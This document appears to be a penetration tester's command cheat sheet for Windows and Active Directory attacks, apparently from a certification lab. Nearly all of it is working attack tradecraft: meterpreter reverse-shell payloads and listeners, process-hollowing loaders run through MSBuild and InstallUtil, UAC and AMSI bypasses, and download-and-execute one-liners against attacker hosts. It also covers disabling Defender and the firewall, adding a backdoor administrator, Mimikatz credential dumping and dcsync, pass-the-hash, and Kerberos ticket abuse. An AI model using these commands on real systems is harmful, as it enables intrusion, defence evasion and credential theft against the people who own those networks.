    //Bloodhound:
        net start neo4j
            http://localhost:7474/browser/
                neo4j / Bloodhound
        Bloodhound.exe
        net stop neo4j

    //RDP Connect:
        xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:192.168.189.11 /u:user /p:lab /size:2800x1900 /tls-seclevel:0 /scale:180 

    //MSF:
        //Listener:
            use multi/handler; set payload windows/x64/meterpreter/reverse_https
            **set EnableStageEncoding true; set StageEncoder x64/xor_dynamic
            setg lhost tun0; setg lport 443; setg exitfunc thread
            //Extra:
                set HandlerSSLCert cert.pem; set StagerVerifySSLCert true           
        //Shells:
            //Staged: sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
            //Non-staged: sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=tun0 LPORT=443 -f exe -o /var/www/html/msfnonstaged.exe

    //Allow Anonymous SMB Access:
        reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /t REG_DWORD /v AllowInsecureGuestAuth /d 1 /f
        (https://learn.microsoft.com/en-US/troubleshoot/windows-server/networking/guest-access-in-smb2-is-disabled-by-default)
        //##If GPO:  reg add HKLM\Software\Policies\Microsoft\Windows\LanmanWorkstation\AllowInsecureGuestAuth /t REG_DWORD /d 1 /f
        //Alternative - SMB Share w/ Creds:
            smbserver.py -smb2support share . -username user -password pass 
            net use \\10.10.14.4\share /u:df df

    //Disable Firewall:
        netsh advfirewall set currentprofile state off

    //Shells:
        //*Hollow.exe:
            \\192.168.49.121\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe
            //**MSBuild File Transfer Bypass Method w/ HTTP Status:
                //Local Prep:
                    //update shellcode in Hollow.csproj...
                    del \\192.168.49.121\visualstudio\file4.txt && certutil -encode \\192.168.49.121\visualstudio\Hollow\Hollow.csproj \\192.168.49.121\visualstudio\file4.txt
                    sudo cp /home/kali/data/file4.txt /var/www/html/ 
                cmd.exe /c del c:\windows\tasks\Hollow.csproj & bitsadmin /Transfer myJob http://192.168.49.121/file4.txt c:\windows\tasks\enc2.txt && certutil -decode c:\windows\tasks\enc2.txt c:\windows\tasks\Hollow.csproj && del c:\windows\tasks\enc2.txt && FOR /F "tokens=* USEBACKQ" %F IN (`whoami`) DO ( bitsadmin /Transfer myJob http://192.168.49.121/%F c:\windows\tasks\enc3.txt ) & FOR /F "tokens=* USEBACKQ" %F IN (`dir /B c:\windows\tasks\Hollow*`) DO ( bitsadmin /Transfer myJob http://192.168.49.121/%F c:\windows\tasks\enc3.txt ) & FOR /F "tokens=* USEBACKQ" %F IN (`dir /B C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe`) DO ( bitsadmin /Transfer myJob http://192.168.49.121/%F c:\windows\tasks\enc3.txt ) & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe c:\Windows\Tasks\Hollow.csproj && bitsadmin /Transfer myJob http://192.168.49.121/COMPLETE c:\windows\tasks\enc3.txt
        //HollowUAC.exe:
            //Prep:
                //srrstr.c:  WinExec("HollowUAC.exe", 0);
                sudo i686-w64-mingw32-gcc-win32 srrstr.c -lws2_32 -o /var/www/html/srrstr.dll -shared && cp /var/www/html/srrstr.dll /home/kali/data/
                del \\192.168.49.121\visualstudio\file.txt && certutil -encode \\192.168.49.121\visualstudio\srrstr.dll \\192.168.49.121\visualstudio\file.txt
                del \\192.168.49.121\visualstudio\file2.txt && certutil -encode \\192.168.49.121\visualstudio\Hollow\HollowUAC\bin\x64\Release\HollowUAC.exe \\192.168.49.121\visualstudio\file2.txt
                sudo cp /home/kali/data/file.txt /var/www/html/ && sudo cp /home/kali/data/file2.txt /var/www/html/   
            //Trigger:
                cmd.exe /c bitsadmin /Transfer myJob http://192.168.49.121/file.txt %USERPROFILE%\Desktop\enc.txt && certutil -decode %USERPROFILE%\Desktop\enc.txt %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\srrstr.dll || del %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\srrstr.dll
                cmd.exe /c timeout /T 25 && certutil -decode %USERPROFILE%\Desktop\enc.txt %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\srrstr.dll & del %USERPROFILE%\Desktop\enc.txt
                $payload = "cmd.exe /c bitsadmin /Transfer myJob http://192.168.49.121/file2.txt %USERPROFILE%\Desktop\enc2.txt && certutil -decode %USERPROFILE%\Desktop\enc2.txt %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\HollowUAC.exe || del %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\HollowUAC.exe
                cmd.exe /c timeout /T 25 && certutil -decode %USERPROFILE%\Desktop\enc2.txt %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\HollowUAC.exe & del %USERPROFILE%\Desktop\enc2.txt & echo 1 > c:\windows\tasks\a.txt"
                cmd /c timeout /T 40 && C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
            \\192.168.45.158\visualstudio\Hollow\HollowUAC\bin\x64\Release\HollowUAC.exe
        //*HollowDLL.dll - MSF running in memory via PS:
            (new-object system.net.webclient).downloadstring('http://192.168.49.121/amsi.txt') | IEX
            $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.121/HollowDLL.dll')
            $assem = [System.Reflection.Assembly]::Load($data)
            $class = $assem.GetType("HollowDLL.Program")
            $method = $class.GetMethod("Hollow")
            $method.Invoke(0, $null)
            //Bypass Method:
                set IP=192.168.49.121
                C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /cmd="echo '#######AMSIBYPASS#######'; (New-Object System.Net.WebClient).DownloadString('http://%IP%/amsi.txt') | IEX; $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.121/HollowDLL.dll'); $assem = [System.Reflection.Assembly]::Load($data); $class = $assem.GetType(\"HollowDLL.Program\"); $method = $class.GetMethod(\"Hollow\"); $method.Invoke(0, $null); echo '#######DONE#######'" /U c:\windows\tasks\S.exe
        //Hollow.exe - MSF running in memory via PS:
            //use HollowDLL if possible
            (new-object system.net.webclient).downloadstring('http://192.168.49.121/amsi.txt') | IEX
            $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.121/Hollow.exe')
            $assem = [System.Reflection.Assembly]::Load($data)
            [Hollow.Program]::Main("".Split())
        //**Freeze Meterpreter Generator & Runner:
            msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw -o sc.bin
            //EXE:
                ./Freeze -I sc.bin -O Frozen.exe -encrypt -console -process 'notepad.exe'
                //192.168.49.121/visualstudio/Freeze/Frozen.exe          
        //Quick PS Shell w/ HoaxShell:
            ./hoaxshell.py -s 192.168.49.121 -cm
                //upgrade: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe \\192.168.49.121\visualstudio\Hollow\Hollow.csproj
        //Quick Reverse Shell w/ Nim:
            nim c -d:mingw --app:gui -o:RevNim.exe rev_shell.nim
            use multi/handler; set payload windows/shell_reverse_tcp
            \\192.168.49.121\visualstudio\RevNim.exe

    //File Transfer:
        //Encoded Bitsadmin:
            certutil -encode \\192.168.45.188\visualstudio\PSApplockerBypass\InstallUtilBypass\bin\x64\Release\InstallUtilBypass.exe \\192.168.45.188\visualstudio\PSApplockerBypass\InstallUtilBypass\bin\x64\Release\file.txt
            bitsadmin /Transfer myJob http://192.168.45.188/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe 
        //PowerShell HTTP:
            //.ps1 Script:
                //Proxy-Aware:
                    IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1')
                //Non-Proxy Aware:
                    $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
            //File Download:
                powershell -c wget http://192.168.49.121/a.txt -outfile c:\windows\tasks\a.txt
                (New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
                //PS 4+:
                    IWR -Uri http://192.168.45.158 -OutFile C:\Users\bob\AppData\Local\Microsoft\WindowsApps\srrstr.dll
                //Using Kerberos Creds:
                    Invoke-WebRequest -UseBasicParsing -UseDefaultCredentials http://web.htb.local
                    //or:  cmd /c curl --negotiate -u : http://web.htb.local -o out.html -v
        //Removing Mark of the Web (MOTW):  echo "" > C:\Tools\InstallUtilBypass.exe:Zone.Identifier (if downloaded from browser - error 0x80131515)

    //**MAIN BYPASS METHODS:
        //Shell:
            1. MSBuild.exe > Hollow.csproj
            2. InstallUtil.exe > In-memory PS load Hollow.dll
        //PS Commands/Enumeration:
            1. InstallUtil.exe > In-memory PS download scripts and run
            2. MSBuild.exe > PowerLessShell.py-generated .csproj file w/ PS commands

    //Disable Defender:
        (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/DisableDefender.ps1') | IEX
            # Remove Windows Defender definitions
            & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
            # Disable Windows Defender real-time monitoring
            Set-MpPreference -DisableRealtimeMonitoring $true
        //Or: c:\PROGRA~1\WINDOW~1\MpCmdRun.exe -RemoveDefinitions -All

    //Create New User & Enable RDP:
        (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/CreateAdmin.ps1') | IEX
            # Create new administrator
            net user bob abc123! /add
            net localgroup administrators bob /add
            # Enable RDP if it's currently disabled
            $RDP = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections"
            if ($RDP.fDenyTSConnections -eq 1) {
                Write-Output "Enabling Remote Desktop..."
                Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
                netsh advfirewall firewall set rule group='remote desktop' new enable=Yes
                Write-Output "Remote Desktop is now enabled."
            } else {
                Write-Output "Remote Desktop is already enabled."
            }
        //MSF:  use post/windows/manage/enable_rdp
        //Enable WinRM:
            Enable-PSRemoting -Force -SkipNetworkProfileCheck

    //Runas:
        runas /netonly /user:child.internal.domain\TestMachine$ "powershell -ep bypass"

    //Run As via PsExec (w/ PW):
        \\192.168.49.121\visualstudio\sysinternals\PsExec64.exe -accepteula \\LocalComputerIPAddress -u DOMAIN\my-user -p mypass CMD
        //or:  Enter-PSSession -Computer appsrv01

    //Mimikatz Run As via Hash (might not work):
            reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /t REG_DWORD /v AllowInsecureGuestAuth /d 1 /f
            copy \\192.168.49.121\visualstudio\mimikatz.exe .
        privilege::debug; sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:cmd.exe
        //Or:  Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:cmd.exe" "exit"'

    //Better - Initiate login via RDP PTH:
        //allow RDP PTH:  New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
        proxychains xfreerdp /u:nicky /pth:a71ad837cd4a6fcd8fd0fedc62c9b209 /v:172.16.167.160 /cert-ignore /size:2800x1900 /scale:180

    //Mimikatz in Memory:
        (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/amsi.txt') | IEX
        (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/Invoke-Mimikatz10.ps1') | IEX
        Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
        Invoke-Mimikatz -Command '"lsadump::dcsync /domain:INFINITY.com /user:infinity\krbtgt" "exit"'
        Invoke-Mimikatz -Command '"lsadump::dcsync /domain:INFINITY.com /user:infinity\administrator" "exit"'

    //Rubeus in Memory:
        $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.210/Rubeus.exe'); $assem = [System.Reflection.Assembly]::Load($data); [Rubeus.Program]::Main("<args>".Split())

    //Kerberos Tickets:
        //Request:
            kiwi_cmd "kerberos::list"
            kiwi_cmd "kerberos::ask /target:MSSQLSvc/sql05.tricky.com:1433"
            kiwi_cmd "kerberos::list /export"
            \\192.168.49.121\visualstudio\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:c:\windows\tasks\t2.kirbi /service:cifs/rdc02.comply.com /dc:rdc02.comply.com /ptt
            //Overpass-the-hash:
                \\192.168.49.121\visualstudio\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /domain:complyedge.com /user:jim /rc4:e48c13cefd8f9456d79cd49651c134e8 /ptt
        //Convert (base64 Rubeus):
            echo -n "ABC...==" | base64 -d > /tmp/ticket
            ticketConverter.py /tmp/ticket /tmp/ticket.ccache
        //Use:
            export KRB5CCNAME=/tmp/ticket.ccache
            sudo echo "172.16.173.151 sql05.tricky.com" >> /etc/hosts
            proxychains mssqlclient.py -k -dc-ip 172.16.173.150 sql05.tricky.com -debug
